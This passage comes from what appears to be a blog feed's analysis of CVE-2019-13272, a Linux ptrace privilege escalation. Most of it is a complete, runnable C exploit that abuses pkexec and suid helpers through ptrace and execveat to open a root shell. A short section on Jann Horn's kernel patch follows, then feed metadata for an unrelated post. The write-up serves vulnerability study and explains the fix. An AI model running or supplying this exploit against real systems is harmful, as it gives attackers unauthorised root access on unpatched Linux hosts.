class="number">0x10</span>;  <span class="comment">// envp -&gt; NULL</span></span><br><span class="line">    regs.r8  = AT_EMPTY_PATH;       <span class="comment">// flags</span></span><br><span class="line"></span><br><span class="line">    ptrace(PTRACE_SETREGSET, child_pid, NT_PRSTATUS, &amp;iov);</span><br><span class="line">    ptrace(PTRACE_DETACH, child_pid, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    waitpid(child_pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Final-EXP"><a href="#Final-EXP" class="headerlink" title="Final EXP"></a>Final EXP</h3><p>最终的 exp 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/elf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pwd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *helper_list[] = </span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;/usr/lib/gnome-settings-daemon/gsd-backlight-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/lib/gnome-settings-daemon/gsd-wacom-led-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/lib/unity-settings-daemon/usd-backlight-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/lib/x86_64-linux-gnu/xfce4/session/xfsm-shutdown-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/sbin/mate-power-backlight-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/bin/xfpm-power-backlight-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/bin/lxqt-backlight_backend&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/libexec/gsd-wacom-led-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/libexec/gsd-wacom-oled-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/libexec/gsd-backlight-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/lib/gsd-backlight-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/lib/gsd-wacom-led-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/lib/gsd-wacom-oled-helper&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *helper = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *helper_basename = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> pipe_for_block[<span class="number">2</span>];</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> self_fd;</span><br><span class="line"><span class="type">pid_t</span> pid_task_b;</span><br><span class="line"><span class="type">pid_t</span> pid_task_c;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* <span class="title function_">findHelper</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">middleStage</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">middlePtracee</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">finalPtracee</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">forceChildToExecve</span><span class="params">(<span class="type">pid_t</span> child_pid, <span class="type">int</span> exec_fd, <span class="type">char</span> *argv)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// mainly for task a, and jmp for stage 2 and 3</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;stage2&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> middleStage();</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;stage3&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> getRootShell();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] CVE-2019-13272 POC of local privileged.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Written by arttnba3.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Start exploiting...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// find the helper</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Finding the helper...&quot;</span>);</span><br><span class="line">    helper = findHelper();</span><br><span class="line">    helper_basename = basename(helper);</span><br><span class="line">    <span class="keyword">if</span> (!helper)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[x] Unable to find suitable helper on your platform!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Using helper: %s\n&quot;</span>, helper);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create the pipe for blocking child</span></span><br><span class="line">    pipe2(pipe_for_block, O_DIRECT | O_CLOEXEC); <span class="comment">// set the pipe in packet mode, which meant that the data should be received in packets</span></span><br><span class="line">    fcntl(pipe_for_block[<span class="number">0</span>], F_SETPIPE_SZ, <span class="number">0x1000</span>);</span><br><span class="line">    write(pipe_for_block[<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>); <span class="comment">// temp packet to make the following ones stuck, the stdout of task B will be redirect to it</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// fork out task B</span></span><br><span class="line">    <span class="comment">// two kinds of writing, all OK</span></span><br><span class="line">    <span class="comment">// pid_task_b = clone(middlePtracee, (size_t)malloc(0x1000 * 100) + 0x1000 * 100, CLONE_VM | CLONE_VFORK | SIGCHLD, NULL);</span></span><br><span class="line">    pid_task_b = fork();</span><br><span class="line">    <span class="keyword">if</span> (!pid_task_b)</span><br><span class="line">    &#123;</span><br><span class="line">        middlePtracee();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;/proc/%d/comm&quot;</span>, pid_task_b);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> comm[<span class="number">0x100</span>];</span><br><span class="line">        <span class="type">int</span> comm_fd = open(buf, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span> (comm_fd &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[x] Failed to read comm of task B!\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        comm[read(comm_fd, comm, <span class="number">0x100</span> - <span class="number">1</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(comm, helper_basename, <span class="number">10</span>))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        usleep(<span class="number">100000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// task B got the root, wait a while it&#x27;ll lose privilege, then task A attach to it</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Task A attaching to task B soooon...&quot;</span>);</span><br><span class="line">    ptrace(PTRACE_ATTACH, pid_task_b, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    waitpid(pid_task_b, <span class="literal">NULL</span>, <span class="number">0</span>); <span class="comment">// 0 means no extra options</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// force the task B to execve stage2</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Forcing task B to execve stage2...&quot;</span>);</span><br><span class="line">    forceChildToExecve(pid_task_b, <span class="number">0</span>, <span class="string">&quot;stage2&quot;</span>);</span><br><span class="line">    <span class="comment">//force_exec_and_wait(pid_task_b, 0, &quot;stage2&quot;);</span></span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* <span class="title function_">findHelper</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">buf</span>;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(helper_list) / <span class="keyword">sizeof</span>(<span class="type">char</span>*); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!stat(helper_list[i], &amp;buf))</span><br><span class="line">            <span class="keyword">return</span> helper_list[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// task B</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">middlePtracee</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    self_fd = open(<span class="string">&quot;/proc/self/exe&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">passwd</span> *<span class="title">pw</span> =</span> getpwuid(getuid());</span><br><span class="line">    pid_task_b = getpid();</span><br><span class="line"></span><br><span class="line">    pid_task_c = fork();</span><br><span class="line">    <span class="keyword">if</span> (!pid_task_c)</span><br><span class="line">        <span class="keyword">return</span> finalPtracee();</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;[+] Task B fork out task C.\n&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;[*] Task B execve pkexec soooon...\n&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">    dup2(self_fd, <span class="number">0</span>); <span class="comment">// got stdin close</span></span><br><span class="line">    dup2(pipe_for_block[<span class="number">1</span>], <span class="number">1</span>); <span class="comment">// redirect stdout to block it</span></span><br><span class="line">    execl(<span class="string">&quot;/usr/bin/pkexec&quot;</span>, basename(<span class="string">&quot;/usr/bin/pkexec&quot;</span>), <span class="string">&quot;--user&quot;</span>, pw-&gt;pw_name, helper, <span class="string">&quot;--helper&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we arrive there, we failed.</span></span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;[x] Failed to execve pkexec!&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// task again B</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">middleStage</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pid_t</span> child = waitpid(<span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    forceChildToExecve(child, <span class="number">114</span>, <span class="string">&quot;stage3&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// task C</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">finalPtracee</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    pid_task_c = getpid();</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="type">char</span> needle[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">char</span> uid_buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> task_B_status_fd;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(needle, <span class="string">&quot;/proc/%d/status&quot;</span>, pid_task_b);</span><br><span class="line">    <span class="built_in">sprintf</span>(uid_buf, <span class="string">&quot;Uid:\t%d\t0\t&quot;</span>, getuid());</span><br><span class="line">    dup2(self_fd, <span class="number">114</span>);</span><br><span class="line">    task_B_status_fd = open(needle, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (task_B_status_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;[x] Failed to get status of task B!&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check out uid of task B</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        buf[pread(task_B_status_fd, buf, <span class="number">0x1000</span> - <span class="number">1</span>, <span class="number">0</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, uid_buf)) <span class="comment">// task B got root</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// let task B(root) be ptracer</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Task B is root now!&quot;</span>);</span><br><span class="line">    ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Task C execve another suid programme sooooon...&quot;</span>);</span><br><span class="line">    execl(<span class="string">&quot;/usr/bin/passwd&quot;</span>, <span class="string">&quot;passwd&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we arrived there, execve failed </span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[x] Task C failed to execve!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// task again C</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    setresuid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    setresgid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// force a child to execve by ptrace through execveat syscall</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">forceChildToExecve</span><span class="params">(<span class="type">pid_t</span> child_pid, <span class="type">int</span> exec_fd, <span class="type">char</span> *argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> </span><br><span class="line">    &#123;</span><br><span class="line">        .iov_base = &amp;regs,</span><br><span class="line">        .iov_len = <span class="keyword">sizeof</span>(regs),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">size_t</span> child_stack;</span><br><span class="line">    <span class="type">size_t</span> insert_data[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line">    ptrace(PTRACE_SYSCALL, child_pid, <span class="number">0</span>, <span class="literal">NULL</span>); <span class="comment">// wait for child meeting a syscall</span></span><br><span class="line">    waitpid(child_pid, <span class="literal">NULL</span>, <span class="number">0</span>);    <span class="comment">// wait for child to execve</span></span><br><span class="line">    ptrace(PTRACE_GETREGSET, child_pid, NT_PRSTATUS, &amp;iov); <span class="comment">// get env of child</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// prepare the stack data</span></span><br><span class="line">    child_stack = (regs.rsp - <span class="number">0x1000</span>) &amp; ~<span class="number">0xfff</span>UL; </span><br><span class="line">    <span class="built_in">memset</span>(insert_data, <span class="number">0</span>, <span class="keyword">sizeof</span>(insert_data));</span><br><span class="line">    <span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line">    insert_data[idx++] = child_stack + <span class="number">0x18</span>;    <span class="comment">// argv arrays</span></span><br><span class="line">    insert_data[idx++] = <span class="number">0</span>;</span><br><span class="line">    insert_data[idx++] = <span class="number">0</span>;                     <span class="comment">// env arrays</span></span><br><span class="line">    insert_data[idx++] = *(<span class="type">size_t</span>*)argv;          <span class="comment">// argv[0]</span></span><br><span class="line">    insert_data[idx++] = <span class="number">0</span>;                     <span class="comment">// path</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// copy to child stack</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; idx; i++)</span><br><span class="line">        ptrace(PTRACE_POKETEXT, child_pid, child_stack + i * <span class="keyword">sizeof</span>(<span class="type">size_t</span>), insert_data[i]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// execveat(exec_fd, NULL, argv, NULL, flags)</span></span><br><span class="line">    regs.orig_rax = __NR_execveat;</span><br><span class="line">    regs.rdi = exec_fd;</span><br><span class="line">    regs.rsi = child_stack + <span class="number">0x20</span>;  <span class="comment">// path -&gt; NULL</span></span><br><span class="line">    regs.rdx = child_stack;         <span class="comment">// argv -&gt; &quot;stagex&quot;, NULL</span></span><br><span class="line">    regs.r10 = child_stack + <span class="number">0x10</span>;  <span class="comment">// envp -&gt; NULL</span></span><br><span class="line">    regs.r8  = AT_EMPTY_PATH;       <span class="comment">// flags</span></span><br><span class="line"></span><br><span class="line">    ptrace(PTRACE_SETREGSET, child_pid, NT_PRSTATUS, &amp;iov);</span><br><span class="line">    ptrace(PTRACE_DETACH, child_pid, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    waitpid(child_pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行即可完成提权</p><p><img src="https://s2.loli.net/2022/01/17/VgmbRFaIZo3qY8u.png" alt="image.png"></p><h1 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03.漏洞修复"></a>0x03.漏洞修复</h1><p>Jann Horn 提交的漏洞修复方案比较简单，如下：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/kernel/ptrace.c b/kernel/ptrace.c</span></span><br><span class="line"><span class="comment">index 8456b6e2205f7..705887f63288d 100644</span></span><br><span class="line"><span class="comment">--- a/kernel/ptrace.c</span></span><br><span class="line"><span class="comment">+++ b/kernel/ptrace.c</span></span><br><span class="line"><span class="meta">@@ -79,9 +79,7 @@</span> void __ptrace_link(struct task_struct *child, struct task_struct *new_parent,</span><br><span class="line">  */</span><br><span class="line"> static void ptrace_link(struct task_struct *child, struct task_struct *new_parent)</span><br><span class="line"> &#123;</span><br><span class="line"><span class="deletion">-rcu_read_lock();</span></span><br><span class="line"><span class="deletion">-__ptrace_link(child, new_parent, __task_cred(new_parent));</span></span><br><span class="line"><span class="deletion">-rcu_read_unlock();</span></span><br><span class="line"><span class="addition">+__ptrace_link(child, new_parent, current_cred());</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>我们可以看出这个补丁只做了一件小事：</p><ul><li><strong>不使用 rcu 机制，将 ptracee-&gt;parent_cred 设为当前进程 cred，即 ptracee 原来的 cred</strong></li></ul><p>这将 ptracer 的权限限制为发起 ptrace 请求的 ptracee 的权限，笔者个人认为这个修复还是比较成功的</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;你不许说他，他是你爹？&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/categories/CVE/"/>
    
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/tags/CVE/"/>
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="提权" scheme="http://blog.arttnba3.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="ptrace" scheme="http://blog.arttnba3.cn/tags/ptrace/"/>
    
  </entry>
  
  <entry>
    <title>【CODE.0x02】软件工程：设计模式浅析</title>
    <link href="http://blog.arttnba3.cn/2022/01/04/CODE-0X02-DESIGN_PATTERN/"/>
    <id>http://blog.arttnba3.cn/2022/01/04/CODE-0X02-DESIGN_PATTERN/</id>
    <published>2022-01-03T16:50:06.000Z</published>
    <updated>2022-03-08T15:47:57.000Z</updated>
    
